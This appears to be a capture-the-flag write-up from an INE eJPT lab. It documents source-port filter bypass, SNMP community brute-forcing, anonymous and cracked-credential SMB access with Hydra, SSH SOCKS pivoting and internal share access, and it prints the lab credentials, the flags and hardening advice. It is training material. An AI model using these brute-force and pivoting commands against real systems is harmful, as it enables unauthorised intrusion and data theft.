<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🌐 Host & Network Penetration Testing — Network Based Attacks CTF 1 🌐</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Host & Network Penetration Testing: Network Based Attacks | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 18 November 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 6/6](https://img.shields.io/badge/Flags%20Captured-6%20%2F%206-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1595.002%20%7C%20T1082%20%7C%20T1110.001%20%7C%20T1039%20%7C%20T1090.001-red?style=flat-square)](https://attack.mitre.org/)
[![CVSS v3.1](https://img.shields.io/badge/Max%20Severity-9.8%20(Critical)-critical?style=flat-square)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
</div>

---

## 📋 Objective & Scope
> **Execute comprehensive host and network security testing across a dual-homed perimeter bastion (`target1.ine.local`) and an isolated internal corporate file server (`target2.ine.local`). The assessment requires bypassing network port filtering by crafting low-numbered source-port traffic (`Ncat -p 53`), interrogating monitored network management layers via SNMP community string brute-forcing (`onesixtyone` / `snmpwalk`), harvesting service account usernames and management directives, mounting unauthenticated and authenticated SMB network shares (`smbclient`), cracking SMB authentication tokens with THC-Hydra (`rockyou.txt`), establishing SSH footholds, pivoting across dual network interfaces (`192.73.134.0/24` &rarr; `192.243.83.0/24`) using SSH dynamic SOCKS tunneling and Proxychains, and exfiltrating restricted database exports to capture all 6 challenge flags.**

- **Perimeter Target (`target1.ine.local` / `192.73.134.3`):** Dual-homed Linux edge server (`BR-EDGE01` / Ubuntu 24.04 LTS) running OpenSSH 9.6p1, Samba 4.19.5, Net-SNMP (v1/v2c), and a filtered diagnostic service on TCP port 13337.
- **Internal Target (`target2.ine.local` / `FILE02` / `192.243.83.3`):** Isolated internal file server accessible only from the perimeter host, running Samba file shares (`dropbox` and restricted `sql-backups`).
- **Attacker Host (`root@INE`):** Kali Linux (`192.73.134.2`).
- **Primary Tooling:** `Nmap`, `Ncat`, `onesixtyone`, `snmpwalk`, `smbclient`, `enum4linux-ng`, `THC-Hydra`, `OpenSSH`, `Proxychains-NG`.

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20075909.png" alt="INE Network Based Attacks CTF 1 dashboard showing tasks and objectives" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge briefing, scope requirements, and 6 flag capture objectives.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20075930.png" alt="INE Challenge Briefing — Tooling, flag format, and attacker environment" width="850px">
  <br><i>Figure 2: INE Challenge Briefing — Recommended tools, flag string format, and attack platform specifications.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20075954.png" alt="INE Challenge Briefing — Target systems architecture and Task 1 scope" width="850px">
  <br><i>Figure 3: INE Challenge Briefing — Perimeter host vs. internal file server architecture and Task 1 diagnostic filter requirements.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20080010.png" alt="INE Challenge Briefing — Tasks 2 and 3 scope requirements" width="850px">
  <br><i>Figure 4: INE Challenge Briefing — Tasks 2 & 3: SNMP management interrogation and unauthenticated SMB share enumeration.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20080024.png" alt="INE Challenge Briefing — Tasks 4, 5, and 6 scope requirements" width="850px">
  <br><i>Figure 5: INE Challenge Briefing — Tasks 4, 5 & 6: Authenticated SMB access, network pivoting, and restricted database share compromise.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Comprehensive TCP/UDP network discovery, service version fingerprinting (`-sV`), and OS detection scripts (`-sC`). |
| **Ncat** | Network stream connection utility with source-port binding (`-p 53`) to bypass perimeter diagnostic port filtering. |
| **onesixtyone** | High-speed SNMP community string scanner leveraging SecLists dictionary lists to crack SNMPv1/v2c credentials. |
| **snmpwalk** | Interrogating SNMP Management Information Base (MIB) trees (`1.3.6.1.4.1.8072.1.3.2`) to harvest system metrics and commands. |
| **smbclient** | Command-line SMB client used for anonymous share enumeration, credentialed authentication, and file retrieval. |
| **enum4linux-ng** | Advanced Samba/Windows information extraction covering workgroups, NetBIOS names, IPC$ sessions, and local user accounts. |
| **THC-Hydra** | High-performance network login brute-forcing tool utilized against SMB on port 445 using the `rockyou.txt` dictionary. |
| **OpenSSH** | Establishing encrypted remote shell sessions, inspecting network interfaces, and deploying dynamic SOCKS proxy tunnels (`-D 1080`). |
| **Proxychains-NG** | Dynamic TCP connection proxifier used to route Kali security tools through SSH SOCKS tunnels into the internal network segment. |

<br>

---

## 🏁 Flag Capture Matrix (6 / 6 Flags Solved)

| Task | Objective Description | Attack Vector / Methodology | Artifact / Source Location | Captured Flag Value |
| :---: | :--- | :--- | :--- | :--- |
| **Task 1** | Get the perimeter host to release its diagnostic token | Low-numbered source port spoofing (`Ncat -p 53`) | `target1.ine.local:13337` diagnostic service banner | `13c208a0d0bd450ea6a9a67c8bf74ea3` |
| **Task 2** | Interrogate the host's management layer | SNMP community brute-force (`mngt`) & MIB tree walk | SNMP OID `NET-SNMP-EXTEND-MIB` command output | `73a34b2030064bcfae361202851c0451` |
| **Task 3** | Enumerate the host's file services without credentials | SMB unauthenticated null session (`smbclient -N`) | `//target1.ine.local/public/notice_to_staff.txt` | `201fa9abe7c04073b934a5fb2d2883a3` |
| **Task 4** | Authenticate to the restricted share | Hydra SMB password cracking (`svc_backup:chocolate`) | `//target1.ine.local/backup/backup_notes.txt` | `6934f1ef67a84a36a18545b8e6fdb222` |
| **Task 5** | Reach the internal file server | SSH dynamic SOCKS pivoting (`-D 1080`) + Proxychains | `//192.243.83.3/dropbox/README.txt` | `72d8cf2e7ead48f083e699d67243c2bf` |
| **Task 6** | Break into the restricted database share | Proxychains credentialed SMB authentication (`db_admin`) | `//192.243.83.3/sql-backups/db_export.txt` | `4b56e89b2017423d9b9d47962295eb43` |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Assessment |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Comprehensive TCP/UDP network scanning with Nmap to discover open perimeter services. |
| **Reconnaissance** | `T1590.002` | Gather Victim Network Information: DNS | Identifying low-numbered well-known traffic expectations (source port 53 / DNS) to bypass packet filters. |
| **Discovery** | `T1082` | System Information Discovery | Interrogating system MIB trees over SNMPv2c to retrieve hostnames, OS kernels, and rack locations. |
| **Discovery** | `T1087.002` | Account Discovery: Domain / Local Account | Recovering service account names (`svc_backup`) from SNMP diagnostic scripts and RPC user enumeration. |
| **Credential Access** | `T1110.001` | Brute Force: Password Guessing | Executing online password dictionary attacks against SMB using THC-Hydra and `rockyou.txt`. |
| **Initial Access / Collection** | `T1039` | Data from Network Shared Drive | Exfiltrating internal notices, maintenance procedures, and database dumps from SMB file shares. |
| **Lateral Movement** | `T1021.004` | Remote Services: SSH | Authenticating to the perimeter host via SSH using cracked service credentials (`svc_backup:chocolate`). |
| **Command and Control** | `T1090.001` | Proxy: Internal Proxy | Establishing an SSH dynamic SOCKS proxy tunnel (`-D 1080`) through the perimeter host to pivot into the internal network. |
| **Discovery** | `T1046` | Network Service Discovery | Auditing local routing tables (`ip route`), network interfaces (`ip a`), and host resolution (`getent hosts`). |
| **Credential Access** | `T1552.001` | Unsecured Credentials: Credentials in Files | Recovering plaintext internal database credentials (`db_admin:Sql!Backup2024`) from shared text documentation. |

<br>

---

## 🔬 Technical Exploitation Walkthrough

---

### Phase 1: Host Enumeration & Diagnostic Port Filtering Bypass (Flag 1)

#### 1. Baseline Target Resolution & Nmap TCP Sweep
We begin the assessment by checking the local DNS mapping in `/etc/hosts` on the Kali Linux attacker host:

```bash
cat /etc/hosts
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20121042.png" alt="Verifying target hostname and IP in /etc/hosts" width="600px">
  <br><i>Figure 6: Local hostname resolution — target1.ine.local mapped to 192.73.134.3.</i>
</div>

<br>

We execute a comprehensive full-port TCP scan using Nmap with service fingerprinting (`-sV`), default scripts (`-sC`), and no ping probe (`-Pn`):

```bash
nmap -p- -sV -sC -Pn -T4 target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20121342.png" alt="Nmap full TCP port scan results for target1.ine.local" width="850px">
  <br><i>Figure 7: Full TCP port scan — Discovery of SSH (22), Samba (139/445), and filtered diagnostic service on 13337/tcp.</i>
</div>

<br>

**Key Port Discoveries:**
- **22/tcp:** OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux)
- **139/tcp & 445/tcp:** Samba smbd 4.19.5-Ubuntu (Workgroup: `ASHCROFT`, NetBIOS name: `BR-EDGE01`)
- **199/tcp:** Linux SNMP multiplexer (`smux`)
- **13337/tcp:** Unknown service returning fingerprint string:
  > `NETDIAG: access denied (diagnostic channel expects mgmt source port)`

#### 2. Investigating UDP Services & NetBIOS Discovery
We perform a focused UDP scan against the SNMP port (161/udp) and review Nmap script results:

```bash
nmap -sU -sV -p 161 target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20121451.png" alt="Nmap UDP scan for port 161 SNMP and NetBIOS discovery" width="850px">
  <br><i>Figure 8: UDP scan confirming Net-SNMP daemon active on port 161/udp.</i>
</div>

<br>

#### 3. Bypassing Diagnostic Port Filtering via Source Port Spoofing (Flag 1)
The diagnostic service on port `13337/tcp` rejects standard connections, stating that the channel expects a "mgmt source port" (low-numbered, well-known port). In enterprise network architectures, stateful firewalls often allow ingress traffic originating from well-known infrastructure ports such as **DNS (Port 53)**.

Using `ncat`, we bind the local outbound source port to `53`:

```bash
ncat -p 53 target1.ine.local 13337
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20121607.png" alt="Connecting to port 13337 with source port 53 to capture Flag 1" width="750px">
  <br><i>Figure 9: Flag 1 Captured — Ncat session originating from source port 53 returns diagnostic token.</i>
</div>

<br>

```text
ASHCROFT-LOGISTICS NETDIAG v2.1
__________________________________
link: UP   mtu: 1500   mgmt: SNMP(v1) enabled on this host
diagnostic token: Flag1_13c208a0d0bd450ea6a9a67c8bf74ea3
```

> 🎯 **Flag 1 Captured:** `13c208a0d0bd450ea6a9a67c8bf74ea3`  
> 💡 *Crucial Intelligence:* The diagnostic banner reveals that network management is actively enabled via **`SNMP(v1) enabled on this host`**.

<br>

---

### Phase 2: SNMP Management Layer Interrogation & Credential Harvesting (Flag 2)

#### 1. SNMP Community String Brute-Forcing
Default community strings (`public`, `private`) failed to respond. We inspect the SecLists wordlists available in `/usr/share/seclists/Discovery/SNMP/`:

```bash
ls /usr/share/seclists/Discovery/SNMP/
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20121713.png" alt="Listing SecLists SNMP wordlists on Kali Linux" width="750px">
  <br><i>Figure 10: SNMP community wordlists in SecLists directory.</i>
</div>

<br>

We launch the high-speed SNMP scanner `onesixtyone` against `192.73.134.3` using `common-snmp-community-strings-onesixtyone.txt`:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 192.73.134.3
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122028.png" alt="onesixtyone discovering the valid SNMP community string 'mngt'" width="800px">
  <br><i>Figure 11: Community string discovered — Valid SNMP community string identified as 'mngt'.</i>
</div>

<br>

#### 2. Querying System MIB & Custom SNMP Extensions (Flag 2)
With the valid community string `mngt`, we interrogate the standard system MIB tree (`1.3.6.1.2.1.1`):

```bash
snmpwalk -v2c -c mngt target1.ine.local 1.3.6.1.2.1.1
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122105.png" alt="Interrogating SNMP system MIB on target1.ine.local" width="850px">
  <br><i>Figure 12: SNMP System MIB — Discloses contact noc@ashcroft.local, hostname BR-EDGE01, and Datacenter Rack location.</i>
</div>

<br>

Next, we interrogate Net-SNMP custom command extensions via the `NET-SNMP-EXTEND-MIB` OID tree (`1.3.6.1.4.1.8072.1.3.2`):

```bash
snmpwalk -v2c -c mngt target1.ine.local 1.3.6.1.4.1.8072.1.3.2
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122139.png" alt="SNMPwalk NET-SNMP-EXTEND revealing Flag 2 and service account svc_backup" width="850px">
  <br><i>Figure 13: Flag 2 Captured — SNMP command extension leaks Flag 2 and the svc_backup service account.</i>
</div>

<br>

The SNMP walk exposes an automated maintenance script reading `/etc/snmp/.flag2`:
```text
iso.3.6.1.4.1.8072.1.3.2.2.1.2.4.100.105.97.103 = STRING: "/bin/cat"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.4.100.105.97.103 = STRING: "/etc/snmp/.flag2"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.98.97.99.107.117.112.110.111.116.101 = STRING: "\"MAINT: nightly backup runs as service account svc_backup (SMB + SSH on this host). Rotate pw quarterly.\""
iso.3.6.1.4.1.8072.1.3.2.3.1.1.4.100.105.97.103 = STRING: "Flag2_73a34b2030064bcfae361202851c0451"
```

> 🎯 **Flag 2 Captured:** `73a34b2030064bcfae361202851c0451`  
> 💡 *Account Discovery:* The system comment reveals the existence of service account **`svc_backup`** with dual access to **SMB + SSH**.

<br>

---

### Phase 3: Unauthenticated SMB Enumeration (Flag 3)

#### 1. Listing Network Shares Without Credentials
We query the perimeter Samba service with an anonymous null session (`-N`):

```bash
smbclient -L //target1.ine.local/ -N
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122247.png" alt="Listing Samba shares using anonymous null session" width="600px">
  <br><i>Figure 14: Anonymous share listing revealing public, backup, and IPC$ shares.</i>
</div>

<br>

**Exposed Shares:**
- **`public`** (Disk) — "Public Staff Notices"
- **`backup`** (Disk) — "Backup Operators Only"
- **`IPC$`** (IPC) — "IPC Service (BR-EDGE01 File Services)"

#### 2. Accessing Public Share & Extracting Flag 3
We connect anonymously to the `public` share:

```bash
smbclient //target1.ine.local/public -N
smb: \> ls
smb: \> more notice_to_staff.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122933.png" alt="Browsing public SMB share with smbclient" width="750px">
  <br><i>Figure 15: Connecting to the unauthenticated public share and reading notice_to_staff.txt.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20122904.png" alt="Contents of notice_to_staff.txt revealing Flag 3" width="750px">
  <br><i>Figure 16: Flag 3 Captured — Notice to staff contains perimeter self-check token.</i>
</div>

<br>

```text
ASHCROFT LOGISTICS - STAFF NOTICE (PUBLIC)
=========================================
Reminder: the general 'public' share is world-readable. Do NOT place sensitive files here. Backup Operators: use the restricted 'backup' share (credentialed access only).

Perimeter self-check token: Flag3_201fa9abe7c04073b934a5fb2d2883a3
```

> 🎯 **Flag 3 Captured:** `201fa9abe7c04073b934a5fb2d2883a3`

<br>

---

### Phase 4: Credential Brute-Forcing & Authenticated Backup Access (Flag 4)

#### 1. Deep SMB Auditing with enum4linux-ng
We verify the password policy and user constraints using `enum4linux-ng`:

```bash
enum4linux-ng -A target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123637.png" alt="enum4linux-ng scan initialization and NetBIOS info" width="750px">
  <br><i>Figure 17: enum4linux-ng target information, NetBIOS resolution, and domain ASHCROFT.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123710.png" alt="enum4linux-ng SMB dialect check and null session" width="750px">
  <br><i>Figure 18: SMB Dialect verification — SMB 3.0 preferred; null session supported.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123741.png" alt="enum4linux-ng RPC session and OS discovery" width="750px">
  <br><i>Figure 19: RPC OS Discovery confirming Samba 4.19.5 on Linux/Unix.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123820.png" alt="enum4linux-ng identifying user svc_backup and share permissions" width="750px">
  <br><i>Figure 20: RPC user enumeration confirming svc_backup (RID 1000); backup share access DENIED to anonymous clients.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123852.png" alt="enum4linux-ng domain password policies" width="750px">
  <br><i>Figure 21: Password policy analysis showing no lockout threshold (`Lockout threshold: None`).</i>
</div>

<br>

#### 2. Cracking svc_backup SMB Password with THC-Hydra
With no account lockout threshold configured, we prepare `/usr/share/wordlists/rockyou.txt`:

```bash
ls -la /usr/share/wordlists/rockyou.txt*
gunzip /usr/share/wordlists/rockyou.txt.gz
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20123233.png" alt="Decompressing rockyou.txt wordlist on Kali" width="650px">
  <br><i>Figure 22: Decompressing the rockyou.txt dictionary.</i>
</div>

<br>

We launch THC-Hydra targeting the SMB service on `192.73.134.3` with the username `svc_backup`:

```bash
hydra -l svc_backup -P /usr/share/wordlists/rockyou.txt 192.73.134.3 smb
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20124011.png" alt="Hydra cracking the SMB password for svc_backup" width="850px">
  <br><i>Figure 23: Password Cracked — Hydra identifies valid password 'chocolate' for svc_backup in 2 seconds.</i>
</div>

<br>

#### 3. Accessing the Restricted Backup Share (Flag 4)
We authenticate to the `backup` share using the recovered credentials:

```bash
smbclient //192.73.134.3/backup -U svc_backup
# Password: chocolate
smb: \> ls
smb: \> more backup_notes.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20124352.png" alt="Authenticated smbclient connection to backup share" width="750px">
  <br><i>Figure 24: Authenticated connection to the restricted backup share.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20124259.png" alt="Reading backup_notes.txt to capture Flag 4" width="750px">
  <br><i>Figure 25: Flag 4 Captured — backup_notes.txt reveals Flag 4 and internal target FILE02 / target2.ine.local.</i>
</div>

<br>

```text
ASHCROFT LOGISTICS - BACKUP OPERATIONS (RESTRICTED)
==================================================
Backup token: Flag4_6934f1ef67a84a36a18545b8e6fdb222

Internal targets reached from this host during nightly jobs:
  FILE02  target2.ine.local
Note: FILE02 only accepts file-share connections originating FROM this host (BR-EDGE01). Direct access from anywhere else is refused. Maintenance is performed by hopping through this host (svc_backup has SSH here).
```

> 🎯 **Flag 4 Captured:** `6934f1ef67a84a36a18545b8e6fdb222`  
> 💡 *Internal Pivot Discovered:* Internal file server **`FILE02`** (`target2.ine.local`) only accepts traffic from `target1`. `svc_backup` has SSH shell access on `target1` to perform network hops!

<br>

---

### Phase 5: Foothold Establishment, Network Pivoting & Internal Access (Flag 5)

#### 1. SSH Foothold on Perimeter Host
We establish an SSH shell session on `target1.ine.local`:

```bash
ssh svc_backup@target1.ine.local
# Password: chocolate
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20125006.png" alt="SSH login to target1.ine.local as svc_backup" width="850px">
  <br><i>Figure 26: SSH shell access established on Ubuntu 24.04 LTS perimeter host.</i>
</div>

<br>

#### 2. Network Interface & Routing Discovery
On `target1`, we inspect the network interfaces and kernel IP routing tables:

```bash
ip a
ip route
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20125050.png" alt="Inspecting network interfaces and IP routing on target1" width="850px">
  <br><i>Figure 27: Dual-homed network configuration — eth0 (192.73.134.3) and internal eth1 (192.243.83.2).</i>
</div>

<br>

The perimeter host possesses two active network interfaces:
- **`eth0`:** `192.73.134.3/24` (Perimeter/Attacker subnet)
- **`eth1`:** `192.243.83.2/24` (Isolated internal corporate subnet)

We resolve the hostname `target2.ine.local`:

```bash
getent hosts target2.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20125229.png" alt="Resolving target2.ine.local to internal IP 192.243.83.3" width="700px">
  <br><i>Figure 28: Resolving target2.ine.local to internal IP 192.243.83.3.</i>
</div>

<br>

#### 3. Establishing SSH Dynamic SOCKS Proxy & Configuring Proxychains
From Kali Linux, we deploy an SSH dynamic SOCKS proxy forwarding traffic through `target1` on local port `1080`:

```bash
ssh -D 1080 -N -f svc_backup@target1.ine.local
```

We configure `/etc/proxychains4.conf` to route traffic through the SOCKS5 proxy on `127.0.0.1:1080`:

```bash
nano /etc/proxychains4.conf
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20130225.png" alt="Configuring /etc/proxychains4.conf" width="850px">
  <br><i>Figure 29: Proxychains configuration — Verifying strict_chain mode.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20130848.png" alt="Setting socks5 127.0.0.1 1080 in ProxyList" width="750px">
  <br><i>Figure 30: Adding socks5 127.0.0.1 1080 to the ProxyList definition.</i>
</div>

<br>

#### 4. Pivoting to Internal Target2 & Capturing Flag 5
We execute `smbclient` through `proxychains` to list shares on the internal server (`192.243.83.3`):

```bash
proxychains smbclient -L //192.243.83.3/ -N
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20130809.png" alt="Proxychains SMB share listing on internal server 192.243.83.3" width="750px">
  <br><i>Figure 31: Pivoted share enumeration — Internal server FILE02 exposes dropbox and sql-backups shares.</i>
</div>

<br>

We connect anonymously to the internal `dropbox` share:

```bash
proxychains smbclient //192.243.83.3/dropbox -N
smb: \> ls
smb: \> more README.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20131136.png" alt="Connecting to internal dropbox share via proxychains" width="750px">
  <br><i>Figure 32: Accessing the internal dropbox share through Proxychains.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20131053.png" alt="Reading README.txt on dropbox share revealing Flag 5" width="750px">
  <br><i>Figure 33: Flag 5 Captured — README.txt contains internal token and leaks db_admin credentials.</i>
</div>

<br>

```text
FILE02 - DROPBOX (internal, guest-readable)
===========================================
Temporary drop location for the internal segment.

Internal token: Flag5_72d8cf2e7ead48f083e699d67243c2bf

DB maintenance (do not distribute):
  restricted share : sql-backups
  account          : db_admin
  password         : Sql!Backup2024
```

> 🎯 **Flag 5 Captured:** `72d8cf2e7ead48f083e699d67243c2bf`  
> 💡 *Database Credentials Harvested:*  
> - **Account:** `db_admin`  
> - **Password:** `Sql!Backup2024`  
> - **Restricted Share:** `sql-backups`

<br>

---

### Phase 6: Restricted Database Share Exploitation (Flag 6)

#### 1. Authenticating to Internal Database Share
Using `proxychains`, we connect to the restricted `sql-backups` share on `192.243.83.3` with the `db_admin` credentials:

```bash
proxychains smbclient //192.243.83.3/sql-backups -U db_admin
# Password: Sql!Backup2024
smb: \> ls
smb: \> more db_export.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20131513.png" alt="Authenticated smbclient session to internal sql-backups share" width="750px">
  <br><i>Figure 34: Authenticated connection to the internal restricted sql-backups share.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-18%20131417.png" alt="Reading db_export.txt to capture Flag 6" width="750px">
  <br><i>Figure 35: Flag 6 Captured — db_export.txt reveals database export integrity token.</i>
</div>

<br>

```text
FILE02 - SQL BACKUPS (RESTRICTED, db_admin only)
================================================
Database export integrity token: Flag6_4b56e89b2017423d9b9d47962295eb43
```

> 🎯 **Flag 6 Captured:** `4b56e89b2017423d9b9d47962295eb43`

<br>

---

## 🏆 Master Flag Evidence Ledger

| Task | Target Host & Port | Access Vector / Mechanism | Captured Flag Value | Verification Proof |
| :---: | :--- | :--- | :--- | :--- |
| **Task 1** | `target1.ine.local:13337` | Low-numbered source port filter bypass (`ncat -p 53`) | `13c208a0d0bd450ea6a9a67c8bf74ea3` | Service banner response on CLI |
| **Task 2** | `target1.ine.local:161` (UDP) | SNMP community brute-force (`mngt`) + OID tree walk | `73a34b2030064bcfae361202851c0451` | NET-SNMP-EXTEND command string output |
| **Task 3** | `//target1.ine.local/public` | Anonymous Samba null-session connection (`-N`) | `201fa9abe7c04073b934a5fb2d2883a3` | File output from `notice_to_staff.txt` |
| **Task 4** | `//target1.ine.local/backup` | Hydra SMB password cracking (`svc_backup:chocolate`) | `6934f1ef67a84a36a18545b8e6fdb222` | File output from `backup_notes.txt` |
| **Task 5** | `//192.243.83.3/dropbox` | SSH dynamic SOCKS proxy (`-D 1080`) + Proxychains | `72d8cf2e7ead48f083e699d67243c2bf` | File output from internal `README.txt` |
| **Task 6** | `//192.243.83.3/sql-backups` | Proxychains SMB auth (`db_admin:Sql!Backup2024`) | `4b56e89b2017423d9b9d47962295eb43` | File output from `db_export.txt` |

<br>

---

## 🛡️ Enterprise Defensive Remediation & Hardening

### 1. Enforce Strict Source Port Firewall Filtering & Terminate Diagnostic Stubs
- **Vulnerability:** The perimeter host exposed an obsolete diagnostic service that granted access purely by inspecting the client's TCP source port (`53/tcp`).
- **Remediation:** Remove obsolete diagnostic daemons (`NETDIAG`) from production edge systems. Configure firewall policies (`iptables` / `nftables`) to reject inbound connections based on destination ports and state verification (`CTSTATE ESTABLISHED,RELATED`), rather than trusting unverified source port numbers:
```bash
# Block untrusted diagnostic ports globally
iptables -A INPUT -p tcp --dport 13337 -j DROP
```

### 2. Modernize SNMP Configurations & Migrate to SNMPv3
- **Vulnerability:** Net-SNMP was executing legacy SNMPv1/v2c protocols using a weak dictionary community string (`mngt`). SNMP custom extensions leaked internal service accounts and maintenance schedules.
- **Remediation:** Disable SNMPv1/v2c. Upgrade all monitoring agents to **SNMPv3** with SHA authentication and AES encryption (`authPriv`). Restrict SNMP listener interfaces exclusively to trusted administrative subnets:
```text
# /etc/snmp/snmpd.conf
createUser monitoringUser SHA-512 "StrongAuthPass!" AES-256 "StrongPrivPass!"
rouser monitoringUser authpriv
```

### 3. Disable Anonymous SMB Access & Enforce Strong Password Complexity
- **Vulnerability:** Anonymous null sessions (`smbclient -N`) were permitted on both perimeter and internal Samba file servers. The service account `svc_backup` used an insecure, dictionary-based password (`chocolate`).
- **Remediation:** Disable guest/anonymous mapping in `smb.conf` and enforce mandatory user authentication for all shares:
```ini
[global]
   restrict anonymous = 2
   usershare allow guests = no
   min domain password length = 14
```

### 4. Segment Bastion Hosts & Implement Jump Server Hardening
- **Vulnerability:** The perimeter host was directly routable to internal corporate file servers (`FILE02`) and permitted arbitrary dynamic SOCKS port forwarding via SSH.
- **Remediation:** Restrict SSH port forwarding capabilities in `/etc/ssh/sshd_config` for non-administrative accounts:
```text
Match Group backup-operators
   AllowTcpForwarding no
   X11Forwarding no
   PermitTunnel no
```

---
<div align="center">
  <i>Walkthrough documented on 18 November 2026. Part of the INE Penetration Testing Student (eJPT v2) Certification Portfolio.</i>
</div>
